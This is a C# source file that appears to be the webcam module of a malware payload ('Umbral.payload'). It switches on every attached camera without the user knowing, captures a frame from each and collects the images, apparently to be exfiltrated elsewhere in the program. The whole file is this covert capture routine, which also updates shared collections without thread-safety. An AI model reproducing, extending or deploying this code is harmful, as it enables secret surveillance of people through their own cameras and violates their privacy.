using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using Umbral.payload.Handlers;

namespace Umbral.payload.Webcam
{
    internal static class ImageCapture
    {
        internal static async Task<Dictionary<string, Bitmap>> CaptureWebcam()
        {
            var images = new Dictionary<string, Bitmap>();

            string[] devices = UsbCamera.FindDevices();
            int remaining = devices.Length;

            Parallel.For(0, devices.Length, i =>
            {
                try
                {
                    UsbCamera.VideoFormat format = UsbCamera.GetVideoFormat(i)[0];
                    UsbCamera camera = new UsbCamera(i, format);
                    camera.Start();
                    Thread.Sleep(1000);
                    Bitmap image = camera.GetBitmap();
                    if (image != null)
                        images.Add(devices[i], image);

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }

                remaining--;
            });

            while (remaining > 0)
            {
                await Task.Delay(1000);
            }

            return images;
        }
    }
}